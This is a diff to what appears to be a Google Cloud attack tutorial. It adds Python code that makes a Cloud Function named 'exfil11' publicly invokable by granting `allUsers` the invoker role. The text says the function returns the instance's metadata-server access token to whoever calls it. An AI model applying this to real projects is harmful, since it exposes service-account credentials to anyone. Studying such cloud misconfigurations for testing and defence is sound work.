@@ -403,8 +403,7 @@ Above gCloud command adds an IAM policy binding to a Google Cloud Functions reso
 (--member=allUsers) to invoke the specified function (&lt;function-name>) in the specified region (--region=&lt;region>) with the cloudfunctions.invoker role 
 (--role=roles/cloudfunctions.invoker). It requires you to have both `cloudfunctions.functions.getIamPolicy` & `cloudfunctions.functions.setIamPolicy` permissions. We can narrow down the permission to just one, using Cloud Function API.
 
-Here's the curl command to call the Cloud Function API via REST 
-and code to call the Cloud Function API via gRPC.
+Here's the curl command that adds an IAM policy binding of `allUsers` with `Cloud Function Invoker` role to a Cloud Function:
 
 ```shell
 curl -X POST \
@@ -461,5 +460,32 @@ Modify the parameters according to your need
   </tr>
 </table>
 <p align="center"><em>Table 7</em></p>
+
+You can also use the gRPC API to add the IAM policy binding of `allUsers` with the role `Cloud Function Invoker` to a Cloud Function. Here's the code for that.
+
+```python
+from google.iam.v1.policy_pb2 import Policy, Binding
+from google.cloud.functions_v1 import CloudFunctionsServiceClient
+import google.auth
+
+credentials, project_id = google.auth.default()
+
+#------change this--------
+location = "us-east1"
+function_name = "exfil11"
+#-------------------------
+
+client = CloudFunctionsServiceClient(credentials=credentials)
+name="projects/{}/locations/{}/functions/{}".format(project_id, location, function_name)
+
+policy = client.get_iam_policy(request={"resource": name})
+binding = Binding(
+    role="roles/cloudfunctions.invoker",
+    members=["allUsers"],
+)
+policy.bindings.append(binding)
+response = client.set_iam_policy(request={"resource": name, "policy": policy})
+print("[+] Done.")
+```
 
 The code will query the metadata server and retrieve an access token and then print that token to the logs and response body when a request is made to that specific endpoint.
